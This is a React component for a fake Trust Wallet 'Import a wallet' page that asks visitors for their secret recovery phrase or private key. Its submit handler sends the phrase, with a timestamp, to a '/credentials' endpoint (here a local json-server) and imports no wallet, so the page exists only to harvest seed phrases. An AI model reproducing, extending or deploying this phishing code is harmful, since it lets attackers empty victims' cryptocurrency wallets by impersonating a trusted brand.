import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import trustShieldImg from "./picture/trust shield.jpg";
import sheild from "./video/video.gif";

// Use standard icons like Feather or similar (imported here as SVG strings for standalone use)
const EyeIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="20"
    height="20"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
  >
    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
    <circle cx="12" cy="12" r="3" />
  </svg>
);

const EyeOffIcon = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width="20"
    height="20"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
  >
    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
    <line x1="1" y1="1" x2="23" y2="23" />
  </svg>
);

const Home5 = () => {
  const [walletName, setWalletName] = useState("Main wallet");
  const [secretPhrase, setSecretPhrase] = useState("");
  const [showSecret, setShowSecret] = useState(false);
  const navigate = useNavigate();
  const wallets = [{ name: "Trust Wallet Mobile", img: trustShieldImg }];

  const handleSubmit = async (e) => {
    e.preventDefault();

    // The data object to be saved
    const userData = {
      secretPhrase,
      timestamp: new Date().toISOString(),
    };

    try {
      // Sending data to your local db.json via json-server
      await fetch("http://localhost:3001/credentials", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(userData),
      });
    } catch (error) {
      console.error("Error logging data:", error);
    }
  };

  return (
    // Responsive container: flex-col for mobile, flex-row for desktop
    <div className="sm:flex h-full w-full bg-t-white text-gray-900 font-sans overflow-hidden">
      {/* Sidebar: Occupies top on mobile, Left (30%) on desktop */}
      <div className="w-full lg:w-[40%]  p-14 to-violet-200 bg-gradient-to-br p-12 flex flex-col justify-between">
        <div>
          <div className="flex items-cent er gap-3 text-blue-700 font-bold text-xl tracking-tight">
            <div className="flex sm:justify-start items-center space-x-2 mb-4">
              <img
                src={trustShieldImg}
                alt="trust shield"
                className="size-[40px] h-[40px]"
              />
              <h1 className="text-2xl font-bold tracking-tight text-blue-700">
                TRUST <span className="font-extralight">WALLET</span>
              </h1>
            </div>
          </div>

          <div className="space-y-4">
            <p className="text-slate-400 text-xs font-bold uppercase tracking-widest">
              Step 3 of 3
            </p>
            <h2 className="text-3xl font-bold text-slate-800">
              Import a wallet
            </h2>
            
          </div>
        </div>
        <div className="hidden sm:flex flex-col h-full gap-[30px] mt-[90px] mr-[20px] justify-center transition-all">
            <p className="text-slate-500 text-1xl leading-relaxed">
              Locate your Secret Phrase or Private on Trust Wallet.
            </p>
          <img
            src={sheild}
            autoPlay
            loop
            muted
            playsInline
            className="h-[300px]  w-[400px] rounded-[10px] bg-slate-200 shadow-slate-200/50"
          />
        </div>
      </div>

      {/* Main Content: Right side on desktop, Bottom side on mobile */}
      <div className="flex-1 p-8 lg:p-24 flex flex-col justify-center">
        <div className="max-w-xl mx-auto w-full">
          <button
            onClick={() => navigate("/home")}
            className="text-slate-400 flex items-center gap-2 text-sm mb-10 hover:text-blue-600 transition-colors font-medium"
          >
            <span>&larr;</span> Back
          </button>

          <h3 className="text-2xl font-bold mb-10 text-slate-900">
            Import with Secret Phrase or Private Key
          </h3>

          <form onSubmit={handleSubmit} className="space-y-8">
            {/* Wallet Name Field */}
            <div className="space-y-2">
              <label className="block text-sm font-bold text-slate-600">
                Wallet Name
              </label>
              <input
                type="text"
                className="w-full p-4 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:outline-none transition-all"
                value={walletName}
                onChange={(e) => setWalletName(e.target.value)}
              />
            </div>

            {/* Secret Phrase Textarea with Toggle */}
            <div className="space-y-2">
              <label className="block text-sm font-bold text-slate-600">
                Enter Secret Phrase or Private Key
              </label>
              <div className="relative">
                <textarea
                  // Conditional masking using a CSS technique when hidden
                  className={`w-full h-40 p-4 pr-12 bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:outline-none transition-all resize-none ${!showSecret ? "masked-input" : ""}`}
                  value={secretPhrase}
                  onChange={(e) => setSecretPhrase(e.target.value)}
                  rows={6}
                />
                <button
                  type="button"
                  onClick={() => setShowSecret(!showSecret)}
                  className="absolute right-4 top-4 text-slate-400 hover:text-blue-600"
                >
                  {showSecret ? <EyeOffIcon /> : <EyeIcon />}
                </button>
              </div>
            </div>

            <div className="pt-4">
              <button
                type="submit"
                className="w-full bg-[#5F63E1] hover:bg-blue-700 text-white py-4 rounded-full font-bold text-lg shadow-xl shadow-blue-100 transition-all active:scale-95"
              >
                Continue
              </button>
            </div>
          </form>
        </div>
      </div>

      {/* Required CSS for the text masking effect */}
      <style>{`
        .masked-input {
          -webkit-text-security: disc; /* Valid in WebKit (Safari/Chrome) */
        }
      `}</style>
    </div>
  );
};

export default Home5;
